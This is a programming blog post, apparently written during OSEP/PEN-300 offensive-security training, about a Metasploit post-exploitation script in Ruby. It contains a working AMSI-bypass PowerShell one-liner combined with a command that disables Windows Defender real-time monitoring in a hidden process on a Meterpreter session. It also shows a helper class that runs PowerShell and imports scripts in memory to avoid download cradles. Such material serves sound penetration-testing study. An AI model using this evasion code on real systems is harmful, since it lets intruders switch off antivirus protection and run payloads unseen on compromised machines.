---
title: "A Class Helper for Metasploit Powershell Extension"
date: 2021-11-28T15:43:16Z
category: Programming
tags: ["OSEP", "PEN300", "Metasploit", "Ruby", "Powershell", "Anti Virus"]
---

Three weeks ago or so I started writing a MSF script that automates repeated tasks such running reconnaissance scripts, dumping credentials, listing tokens that could be impersonated and so on.

The current script does all what I have listed above among other things, however, some part of the code generates Powershell cradles and executes Powershell commands, I would say that this is not an elegant way to do it.

For instance, here are two examples where I run Powershell commands:

```ruby
def disable_defender
	patchamsi = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);"
	disableDefenderPWSHCMD = 'Set-MpPreference -DisableRealtimeMonitoring $true'
	arg = "/c powershell -exec bypass -c #{patchamsi}#{disableDefenderPWSHCMD}"
	pwshprocess = session.sys.process.execute('C:\\Windows\\System32\\cmd.exe', arg, { 'Hidden' => true })
	print_good("\tPowershell PID: #{pwshprocess.pid}")
	print_good("\tWindows Defender should be disabled now")
	pwshprocess.close
	rescue Exception => e
		print_error("Disabling Windows Defender failed: #{e}")
end
```

Above code disable Windows Defender using `Set-MpPreference` a Powershell command. I manually generate a Powershell command and then runs it as a child of a CMD process.

The second example is where I would like to know if the current box sets `Powershell Restricted Language`.

```ruby
def is_restricted_language?
	cmd = cmd_exec('powershell -exec bypass -c $ExecutionContext.SessionState.LanguageMode')
	return true if cmd.include? 'ConstrainedLanguage'
	false
end
```

The piece of code above, simply reads the returned value of `$ExecutionContext.SessionState.LanguageMode` then returns a boolean.

Looking at the documentation of Metasploit ruby API, I found a nice API part of `# Rex::Post::Meterpreter::Extensions::Powershell::Powershell` class, the two interesting functions are:
- run_string
- import_file

Those functions will be so handy, specially import_file, no need to a download cradle anymore or even worse downloading a file to disk. 

Both functions takes a hash as a parameter, this makes writing the code more painful, beside the fact that the initialization of the class is done in two steps.

First, we need to load the extension by using `session.core.load("powershell")`  the function returns true if success, false otherwise, hence we need to to check the returned value before initializing the class itself. So I decided to create a class helper that do that at the initialization of the class and then we create a global instance of that class, which I can call when and where I desire.

```ruby
class PowershellHelper
	def initialize(client)
		if client.core.use('powershell')
			print_good("\tPowershell loaded!")
			@powershell = Rex::Post::Meterpreter::Extensions::Powershell::Powershell.new(client)
		else
			print_error("\tLoading Powershell failed")
		end
	end

	def execute_command(command)
		@powershell.execute_string({:code => command})
	end

	def load_script(file)
		if @powershell.import_file({:file => file})
			print_good("\t#{file} imported")
		else
			print_error("\timporting #{file} failed")
		end
	end
end
```

The constructing does the boring task, next I created more named functions that takes strings rather a hash, which makes reduces the calories we burn when typing on the keyboard.

The usage now is more simple, we start by creating a global PowershellHelper instance.

```ruby
$powershell = PowershellHelper.new(session)
```

Then we simply invoke one of the wished function anywhere in the code, below is the altered version of is_restricted_language?(). 

```ruby
def is_restricted_language?
	cmd = $powershell.execute_command('$ExecutionContext.SessionState.LanguageMode')
	return true if cmd.include? 'ConstrainedLanguage'
	false
end
```


references:
- https://www.offensive-security.com/metasploit-unleashed/custom-scripting/ 
- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html
- https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Powershell/Powershell 
- https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/
- https://www.windowscentral.com/how-manage-microsoft-defender-antivirus-powershell-windows-10 